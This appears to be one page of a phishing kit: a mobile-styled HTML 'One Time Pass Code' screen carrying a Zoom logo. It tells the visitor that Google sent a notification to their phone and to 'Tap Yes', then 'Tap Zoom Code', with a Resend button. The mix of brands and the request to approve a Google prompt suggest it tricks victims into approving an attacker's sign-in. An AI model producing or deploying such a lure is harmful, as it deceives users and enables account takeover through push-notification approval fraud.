<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>One Time Pass Code</title>

  <link rel="icon" type="image/png" href="../../logo.png" />
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    html, body {
      width: 100%;
      height: 100vh;
      background-color: #ffffff;
      color: #202124;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }

    /* Phone screen-er sathe auto match koranor jonno responsive container */
    .container {
      width: 100%;
      height: 100vh;
      max-width: 420px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;
      text-align: center;
      padding: 3vh 5vw 4vh 5vw;
      background: #ffffff;
    }

    .content-box {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      margin: auto 0;
    }

    /* Top Logo */
    .logo {
      width: 13vw;
      max-width: 55px;
      height: auto;
      object-fit: contain;
      margin-bottom: 1.5vh;
      border-radius: 50%;
    }

    /* Main Title */
    h1 {
      font-size: clamp(19px, 4.8vw, 23px);
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 2vh;
    }

    /* Phone Graphic Illustration (Phone screen onujayi auto size hobe) */
    .phone-illustration {
      width: 42vw;
      max-width: 175px;
      height: auto;
      object-fit: contain;
      margin-bottom: 2vh;
    }

    /* Sub Heading */
    h2 {
      font-size: clamp(17px, 4.2vw, 20px);
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 1vh;
    }

    /* Description Text */
    .desc-text {
      font-size: clamp(14px, 3.6vw, 15.5px);
      font-weight: 600;
      color: #1f2937;
      line-height: 1.4;
    }

    .desc-text span {
      font-weight: 800;
      color: #000000;
    }

    /* Resend Button */
    .btn-join {
      background-color: #007aff;
      color: white;
      padding: 13px 0;
      width: 100%;
      max-width: 320px;
      font-size: 16px;
      font-weight: bold;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      box-shadow: 0 4px 12px rgba(0, 122, 255, 0.25);
      transition: background-color 0.2s, transform 0.1s;
    }

    .btn-join:hover {
      background-color: #005ec4;
    }

    .btn-join:active {
      transform: scale(0.98);
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="content-box">
      <img class="logo" src="../../Zoom-Logo.png" alt="Logo">
      <h1>One Time Pass Code</h1>
      <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">
      <h2>Check your phone.</h2>
      <p class="desc-text">
        Google sent a notification to your phone.<br>
        <span>Tap Yes</span> on the notification<br>
        Then Tap Zoom Code
      </p>
    </div>

    <button class="btn-join" onclick="window.location.href='../'">Resend</button>
  </div>

</body>
</html>
